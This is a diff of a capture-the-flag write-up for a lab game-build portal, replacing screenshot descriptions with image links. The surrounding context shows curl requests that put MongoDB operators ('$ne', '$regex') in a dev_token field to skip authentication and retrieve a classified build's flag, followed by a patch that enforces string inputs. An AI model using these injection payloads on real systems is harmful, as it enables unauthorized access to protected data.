@@ -30,17 +30,12 @@ Start by requesting the public catalog to see what the service exposes.
 ```bash
 curl -s http://<target>:8009/api/builds | jq
 ```
-
-> 📸 **Screenshot:** terminal output of the `/api/builds` response,
-> showing the public entries and the one `"classified": true` entry
-> with its hidden name.
+![ss](1.png)
 
 Four titles return full details. One entry is `classified` and has no
 visible name — note its `game_id` (e.g. `gta7`). This is the target.
 
-> 📸 **Screenshot:** browser view of the portal homepage
-> (`http://<target>:8009/`) with the catalog cards rendered, the
-> restricted card highlighted.
+![ss](2.png)
 
 ---
 
@@ -58,8 +53,7 @@ curl -s -X POST http://<target>:8009/api/download_build \
 {"status":"error","message":"No build found for that game ID / dev token combination."}
 ```
 
-> 📸 **Screenshot:** terminal showing the `404` / "No build found"
-> response for the guessed token.
+![ss](3.png)
 
 A real token is a random 64-character hex string, so guessing or
 brute-forcing it is not practical.
@@ -85,9 +79,7 @@ curl -s -X POST http://<target>:8009/api/download_build \
 }
 ```
 
-> 📸 **Screenshot:** terminal showing the successful injected request
-> and the JSON response with the `flag` field visible (redact or crop
-> the flag if this writeup will be shared before the event retires).
+![ss](4.png)
 
 **Step 2b — Equivalent payload**, useful if `$ne` is specifically
 blocked:
@@ -98,8 +90,7 @@ curl -s -X POST http://<target>:8009/api/download_build \
   -d '{"game_id": "gta7", "dev_token": {"$regex": "^.*"}}'
 ```
 
-> 📸 **Screenshot:** terminal showing the `$regex` variant also
-> succeeding (optional — include only if you tested it).
+![ss](5.png)
 
 ---
 
@@ -173,15 +164,10 @@ untouched.
 1. Re-run Step 2/2b above → should now return
    `400 'game_id' and 'dev_token' must be strings.`
 
-   > 📸 **Screenshot:** terminal showing the `400` response after the
-   > patch is applied.
 
 2. Confirm legitimate flows still work — a real token for a
    non-classified build (e.g. `bar1`) should still return `200` with a
    `download_url`.
-
-   > 📸 **Screenshot:** terminal showing a normal, successful request
-   > with a real string token after the patch.
 
 ---
 
